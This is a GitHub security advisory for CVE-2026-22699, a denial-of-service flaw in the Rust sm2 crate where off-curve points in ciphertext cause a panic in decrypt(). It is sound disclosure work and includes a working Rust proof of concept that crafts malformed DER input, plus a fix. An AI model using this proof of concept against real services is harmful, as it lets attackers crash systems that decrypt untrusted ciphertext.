# [H] SM2-PKE has Unchecked AffinePoint Decoding (unwrap) in decrypt()

## Summary
Severity: High
Advisory: GHSA-78p6-6878-8mj6
CVE: CVE-2026-22699
CWE: CWE-20
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-01-09
Source: https://github.com/advisories/GHSA-78p6-6878-8mj6
Type: github-advisory

## Affected
- crates.io: `sm2` — affected >=0.14.0-pre.0

## Details
### Summary

A denial-of-service vulnerability exists in the SM2 PKE decryption path where an invalid elliptic-curve point (C1) is decoded and the resulting value is unwrapped without checking. Specifically, `AffinePoint::from_encoded_point(&encoded_c1)` may return a `None`/`CtOption::None` when the supplied coordinates are syntactically valid but do not lie on the SM2 curve. The calling code previously used `.unwrap()`, causing a panic when presented with such input.




### Affected Component / Versions

- File: `src/pke/decrypting.rs`

- Function: internal `decrypt()` (invoked by `DecryptingKey::decrypt*` methods)

- Affected releases: 

  - sm2 0.14.0-rc.0 (https://crates.io/crates/sm2/0.14.0-rc.0)
  - sm2 0.14.0-pre.0 (https://crates.io/crates/sm2/0.14.0-pre.0)

  


### Details

The library decodes the C1 field (an EC point) as an `EncodedPoint` and then converts it to an `AffinePoint` using `AffinePoint::from_encoded_point(&encoded_c1)`. That conversion returns a `CtOption<AffinePoint>` (or an `Option` equivalent) which will indicate failure when the coordinates do not satisfy the curve equation. The code then called `.unwrap()` on that result, causing a panic when
`None` was returned. Because `EncodedPoint::from_bytes()` only validates format (length and SEC1
encoding) and not mathematical validity, an attacker can craft `C1 = 0x04 || X || Y` with X and Y of the right length that nonetheless do not satisfy the curve. Such inputs will pass the format check but trigger `from_encoded_point()` failure and therefore panic on `.unwrap()`.




### Proof of Concept (PoC)

`examples/poc_der_invalid_point.rs` constructs an ASN.1 DER `Cipher` structure
with `x` and `y` set to arbitrary 32-byte values (e.g., repeating 0x11 and 0x22),
and passes it to `DecryptingKey::decrypt_der`. With the vulnerable code, this
produces a panic originating at the `unwrap()` call in `decrypt()`. Other APIs such as `DecryptingKey::decrypt` also produce a panic with invalid C1 point.

``` rust
//! PoC: trigger invalid-point panic via `decrypt_der` by providing ASN.1 DER
//! where x/y are valid-length integers but do not lie on the curve.
//!
//! Usage:
//!   RUST_BACKTRACE=1 cargo run --example poc_der_invalid_point

use rand_core::OsRng;
use sm2::SecretKey;
use sm2::pke::DecryptingKey;

fn build_der(x: &[u8], y: &[u8], digest: &[u8], cipher: &[u8]) -> Vec<u8> {
    // Build SEQUENCE { INTEGER x, INTEGER y, OCTET STRING digest, OCTET STRING cipher }
    let mut body = Vec::new();

    // INTEGER x
    body.push(0x02);
    body.push(x.len() as u8);
    body.extend_from_slice(x);

    // INTEGER y
    body.push(0x02);
    body.push(y.len() as u8);
    body.extend_from_slice(y);

    // OCTET STRING digest
    body.push(0x04);
    body.push(digest.len() as u8);
    body.extend_from_slice(digest);

    // OCTET STRING cipher
    body.push(0x04);
    body.push(cipher.len() as u8);
    body.extend_from_slice(cipher);

    // SEQUENCE header
    let mut der = Vec::new();
    der.push(0x30);
    der.push(body.len() as u8);
    der.extend(body);
    der
}

fn main() {
    let mut rng = OsRng;
    let sk = SecretKey::try_from_rng(&mut rng).expect("failed to generate secret key");
    let dk = DecryptingKey::new(sk);

    // x/y are 32-byte values that almost certainly are NOT on the curve
    let x = [0x11u8; 32];
    let y = [0x22u8; 32];
    let digest = [0x33u8; 32];
    let cipher = [0x44u8; 16];

    let der = build_der(&x, &y, &digest, &cipher);

    println!("Calling decrypt_der with DER (len={})...", der.len());

    // Expected to panic in decrypt() when validating the point (from_encoded_point().unwrap())
    let _ = dk.decrypt_der(&der);

    println!("decrypt_der returned (unexpected) - PoC did not panic");
}

```

Run locally:

```bash
RUST_BACKTRACE=1 cargo run --example poc_der_invalid_point --features std
```

The process will panic with a backtrace pointing to `src/pke/decrypting.rs` at the `from_encoded_point(...).unwrap()` call.




### Impact

- Denial of Service: an attacker who can submit ciphertext (or DER ciphertext)
  can crash the decrypting thread/process.
- Low attacker effort: crafting random 32-byte X/Y values that are not on the
  curve is trivial.
- Wide exposure: any service that accepts ciphertext and links this library is
  vulnerable.


### Recommended Fix

Do not call `.unwrap()` on the result of `AffinePoint::from_encoded_point()`.
Instead, convert the `CtOption` to an `Option` (or inspect it) and return a
library `Err` for invalid points. Example minimal fix:

```rust
    // Return an error instead of panicking when the provided point is not on the curve.
    let mut c1_point: AffinePoint = match AffinePoint::from_encoded_point(&encoded_c1).into() {
        Some(p) => p,
        None => return Err(Error),
    };
```

This ensures `decrypt()` returns a controlled error for invalid or malformed points instead of panicking.



### **Credit**

This vulnerability was discovered by:

- XlabAI Team of Tencent Xuanwu Lab

- Atuin Automated Vulnerability Discovery Engine

CVE and credit are preferred.

If developers have any questions regarding the vulnerability details, please feel free to reach for further discussion via email at xlabai@tencent.com.

 

### **Note**

This organization follows the security industry standard disclosure policy—the 90+30 policy (reference: https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html). If the aforementioned vulnerabilities cannot be fixed within 90 days of submission, we reserve the right to publicly disclose all information about the issues after this timeframe.

## References
- https://github.com/RustCrypto/elliptic-curves/security/advisories/GHSA-78p6-6878-8mj6
- https://nvd.nist.gov/vuln/detail/CVE-2026-22699
- https://github.com/RustCrypto/elliptic-curves/pull/1602
- https://github.com/RustCrypto/elliptic-curves/commit/085b7bee647029bd189e1375203418205006bcab
- https://github.com/RustCrypto/elliptic-curves
